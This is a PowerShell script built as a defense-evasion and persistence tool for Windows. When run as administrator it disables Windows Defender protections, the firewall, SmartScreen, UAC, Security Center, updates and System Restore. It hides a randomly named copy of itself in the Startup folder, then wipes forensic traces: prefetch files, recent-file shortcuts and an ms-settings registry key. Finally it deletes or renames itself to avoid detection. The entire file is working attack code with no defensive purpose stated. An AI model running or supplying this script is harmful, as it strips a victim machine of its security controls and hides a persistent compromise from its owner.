# Get the full path and content of the currently running script
Write-Host "Getting script path..."
$ScriptPath = $MyInvocation.MyCommand.Path
$ExePath = (Get-Process -Id $PID).Path
$FullPath = if ($ScriptPath) { $ScriptPath } else { $ExePath }
$startupPath = Join-Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup\'

Write-Host "Script path: $FullPath"
Write-Host "Startup path: $startupPath"

# Function to replicate the script to the startup folder
function Invoke-SelfReplication {
    Write-Host "Invoking self-replication..."
    $replicated = [System.IO.Path]::Combine($startupPath, [System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath))
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        Set-Content -Path $replicated -Value (Get-Content -Path $FullPath -Raw)
        (Get-Item $replicated).Attributes = 'Hidden'
        Write-Host "Script replicated to $replicated"
    }
}

# Function to leave no traces
function Invoke-SelfDestruction {
    Write-Host "Invoking self-destruction..."

    # Remove registry keys related to ms-settings
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force -ErrorAction SilentlyContinue

    # Delete prefetch files related to this script
    Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*POWERSHELL*.pf" | Remove-Item -Force -ErrorAction SilentlyContinue
    $scriptName = [System.IO.Path]::GetFileNameWithoutExtension($FullPath)
    $prefetchFiles = Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "$scriptName*.pf"
    if ($prefetchFiles) {
        foreach ($file in $prefetchFiles) {
            Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
        }
    }

    # Delete all the shortcut (.lnk) files that have been accessed or modified within the last day
    $recentFiles = Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" | Where-Object { $_.LastWriteTime -ge ((Get-Date).AddDays(-1)) }
    if ($recentFiles) {
        foreach ($file in $recentFiles) {
            Remove-Item -Path $file.FullName -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # Delete itself if the script isn't in startup; if it is, then rename it with a random name every execution to reduce the risk of detection
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        if ($ScriptPath) {
            Remove-Item -Path $FullPath -Force -ErrorAction SilentlyContinue
        } else {
            Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
        }
    } else {
        Rename-Item $FullPath -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath)) -Force -ErrorAction SilentlyContinue
    }
    Write-Host "Self-destruction completed."
}

# Function to set registry properties
function Set-RegistryProperties {
    param (
        [string]$path,
        [hashtable]$properties
    )
    Write-Host "Setting registry properties for path: $path"
    if (-not (Test-Path $path)) {
        New-Item -Path $path -Force | Out-Null
    }

    foreach ($key in $properties.Keys) {
        Set-ItemProperty -Path $path -Name $key -Value $properties[$key] -Type DWord -Force
    }
    Write-Host "Registry properties set for path: $path"
}

# If running as admin, perform the registry modifications
Write-Host "Checking if running as admin..."
if ((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Running as admin. Modifying registry..."

    # Define the reg paths
    $baseKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    $realTimeProtectionKey = "$baseKey\Real-Time Protection"
    $firewallPath = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"

    # First, disable security notifications shown by Windows
    Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -properties @{"Enabled" = 0}
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -properties @{"DisableNotifications" = 1}

    # Disable Windows Defender features
    Set-RegistryProperties -path $baseKey -properties @{
        "DisableAntiSpyware" = 1 # Main disabling
        "DisableApplicationGuard" = 1
        "DisableControlledFolderAccess" = 1
        "DisableCredentialGuard" = 1
        "DisableIntrusionPreventionSystem" = 1
        "DisableIOAVProtection" = 1
        "DisableRealtimeMonitoring" = 1
        "DisableRoutinelyTakingAction" = 1
        "DisableSpecialRunningModes" = 1
        "DisableTamperProtection" = 1
        "PUAProtection" = 0
        "ServiceKeepAlive" = 0
    }

    Set-RegistryProperties -path $realTimeProtectionKey -properties @{
        "DisableBehaviorMonitoring" = 1
        "DisableBlockAtFirstSeen" = 1
        "DisableCloudProtection" = 1
        "DisableOnAccessProtection" = 1
        "DisableScanOnRealtimeEnable" = 1
        "DisableScriptScanning" = 1
        "SubmitSamplesConsent" = 2
    }

    # Disable Windows Firewall
    Set-RegistryProperties -path "$firewallPath\DomainProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
    Set-RegistryProperties -path "$firewallPath\StandardProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
    Set-RegistryProperties -path "$firewallPath\PublicProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}

    # Disable Windows Defender SmartScreen
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
    Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled" -properties @{"(Default)" = 0}
    Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -properties @{"EnableWebContentEvaluation" = 0}

    # Disable Automatic Updates
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -properties @{"NoAutoUpdate" = 1}

    # Disable System Restore
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -properties @{"DisableSR" = 1; "DisableConfig" = 1}
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\srservice" -properties @{"Start" = 4}

    # Disable Remote Desktop Connections
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -properties @{"fDenyTSConnections" = 1}

    # Disable User Account Control (UAC)
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"EnableLUA" = 0}

    # Disable Windows Security Center
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -properties @{"Start" = 4}

    # Disable Error Reporting to Microsoft
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -properties @{"Disabled" = 1}

    # Disable Windows Feedback
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\SQMClient\Windows" -properties @{"CEIPEnable" = 0}

    # Disable Telemetry and Data Collection
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -properties @{"AllowTelemetry" = 0}

    Write-Host "Registry modifications complete."

    # Optionally, you can invoke self-replication and self-destruction here
    Invoke-SelfReplication
    Invoke-SelfDestruction
} else {
    Write-Host "Not running as admin. Please run the script with elevated privileges."
}
Write-Host "Script execution completed."
